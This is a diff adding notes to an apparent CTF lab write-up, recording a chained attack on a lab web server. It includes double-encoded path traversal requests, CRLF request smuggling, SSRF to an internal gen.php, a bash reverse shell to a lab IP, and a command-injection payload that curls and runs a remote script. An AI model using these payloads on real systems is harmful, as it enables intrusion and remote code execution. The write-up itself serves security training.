@@ -271,7 +271,7 @@ Task Completed
 <br>
 <br>
 
-<h3>/page/home.html>/h3>
+<h3>/page/home.html</h3>
 
 <img width="1122" height="578" alt="image" src="https://github.com/user-attachments/assets/39be057d-a09d-4d60-b974-e1d535e1aa76" />
 
@@ -282,7 +282,7 @@ Task Completed
 <br>
 <br>
 
-<h3>/page/index.php>/h3>
+<h3>/page/index.php</h3>
 
 <img width="1122" height="578" alt="image" src="https://github.com/user-attachments/assets/39be057d-a09d-4d60-b974-e1d535e1aa76" />
 
@@ -471,4 +471,159 @@ uid=0(root) gid=0(root) groups=0(root),998(docker),1001(rvm)
 ...
 /root/Contrabando
 ```
+
+
+
+<p>---------------------------</p>
+
+
+
+
+<img width="958" height="390" alt="image" src="https://github.com/user-attachments/assets/ac3f95e0-9dac-4362-a5ba-15d744c23fa3" />
+
+<br>
+
+<img width="1277" height="375" alt="image" src="https://github.com/user-attachments/assets/797e7424-717d-402f-adf4-18c7b7fad319" />
+
+
+<h3>/etc/passwd</h3>
+<br>
+
+<img width="1277" height="432" alt="image" src="https://github.com/user-attachments/assets/534517d2-d611-4328-8161-7854203598e9" />
+
+<h3>/page/index.php</h3>
+<br>
+
+
+<img width="1271" height="431" alt="image" src="https://github.com/user-attachments/assets/d108dfbe-d8e9-4c1a-bde7-ae36158473eb" />
+
+
+<h3>/page/http://localhost:8080/gen.php</h3>
+
+
+GET /page/http:%252f%252flocalhost:8080/gen.php HTTP/1.1
+Host: 10.201.95.120
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+
+
+HTTP/1.1 200 OK
+Date: Tue, 19 Aug 2025 00:07:48 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Content-Length: 45
+Content-Type: text/html; charset=UTF-8
+Connection: close
+
+Please insert the length parameter in the URL
+
+
+
+
+
+
+
+GET /page/index.php%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/SMUGGLED HTTP/1.1
+Host: 10.201.95.120
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+
+
+[HTTP/1.1 200 OK
+Date: Tue, 19 Aug 2025 00:10:54 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 148
+Content-Type: text/html; charset=UTF-8
+Connection: close
+
+<?php 
+
+$page = $_GET['page'];
+if (isset($page)) {
+    readfile($page);
+} else {
+    header('Location: /index.php?page=home.html');
+}
+
+?>
+
+
+
+
+
+~# cat rev.sh
+bash -c 'bash -i >& /dev/tcp/10.201.42.203/4444 0>&1'
+root@ip-10-201-42-203:~# cat pre.txt
+POST /gen.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+
+length=8;sh -c "$(curl -s 10.201.42.203:8000/rev.sh|bash)"
+
+
+
+
+<img width="1281" height="464" alt="image" src="https://github.com/user-attachments/assets/2d36388c-1019-4f6c-b8bd-8483e8b87cd9" />
+
+
+
+
+<h3>/page/hey</h3>
+
+
+<h3>GET /page/index.php%20HTTP/1.1%0d%0ahey:%20hey HTTP/1.1</h3>
+
+<img width="1270" height="424" alt="image" src="https://github.com/user-attachments/assets/7f003fe1-91d9-4fd4-a0ca-9ba974a0ddd1" />
+
+
+
+
+
+<img width="1271" height="571" alt="image" src="https://github.com/user-attachments/assets/c41310ec-8387-47fa-964d-37e52a972e13" />
+
+
+GET /page/%252f%252e%252e%252f%252e%252e%252f%252e%252e/etc/apache2/sites-available/000-default.conf HTTP/1.1
+Host: 10.201.95.120
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+
+
+HTTP/1.1 200 OK
+Date: Tue, 19 Aug 2025 00:03:48 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 1334
+Content-Type: text/html; charset=UTF-8
+Connection: close
+
+<VirtualHost *:8080>
+
+<img width="1275" height="566" alt="image" src="https://github.com/user-attachments/assets/551e6c77-76bd-4f07-a9bf-fc081e909a73" />
+
+
+
+<img width="555" height="147" alt="image" src="https://github.com/user-attachments/assets/7dfd509c-1e60-49a0-a8cc-7a271e413d77" />
+
 
